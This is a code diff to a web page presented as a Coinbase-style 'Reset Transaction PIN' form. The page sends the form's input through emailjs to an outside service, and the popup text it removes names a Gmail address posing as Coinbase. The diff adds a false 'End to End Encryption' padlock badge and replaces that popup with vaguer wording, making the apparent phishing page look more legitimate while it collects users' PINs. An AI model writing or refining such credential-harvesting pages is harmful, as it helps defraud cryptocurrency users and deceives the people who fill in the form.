@@ -128,6 +128,21 @@
       100% { transform: rotate(360deg); }
     }
 
+    .encryption-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+
+    .encryption-text img {
+      width: 14px;
+      height: 14px;
+      margin-right: 5px;
+    }
+
     .popup-overlay {
       display: none;
       position: fixed;
@@ -153,12 +168,14 @@
     .popup h2 {
       font-size: 20px;
       margin-bottom: 10px;
+      color: #4c8ffb;
     }
 
     .popup p {
       font-size: 14px;
       color: #ccc;
       margin-bottom: 20px;
+      line-height: 1.5;
     }
 
     .popup .btn {
@@ -189,12 +206,17 @@
         <span class="btn-text">Reset Transaction PIN</span>
       </button>
     </form>
+
+    <div class="encryption-text">
+      <img src="https://img.icons8.com/material-rounded/24/888888/lock--v1.png" alt="Padlock Icon" />
+      End to End Encryption
+    </div>
   </div>
 
   <div class="popup-overlay" id="popup-overlay">
     <div class="popup">
-      <h2>Success</h2>
-      <p>Your PIN reset request has been submitted and an email has been sent to coinbasegroupofficial@gmail.com. A copy was also sent to our support team.</p>
+      <h2>Request Submitted</h2>
+      <p>Your transaction PIN reset request has been successfully submitted. You can now proceed to the confirmation page.</p>
       <button id="popup-btn" class="btn btn-primary">Continue</button>
     </div>
   </div>
@@ -223,7 +245,6 @@
       resetPinBtn.classList.add('loading');
       resetPinBtn.disabled = true;
 
-      // Changed from 1 second to 4 seconds
       await new Promise(resolve => setTimeout(resolve, 4000));
 
       emailjs.send('service_l9x0u2d', 'template_wia8v9o', {
@@ -240,7 +261,7 @@
     });
 
     document.getElementById('popup-btn').addEventListener('click', function() {
-      window.location.href = 'success.html';
+      window.location.href = 'successful.html';
     });
   </script>
 </body>
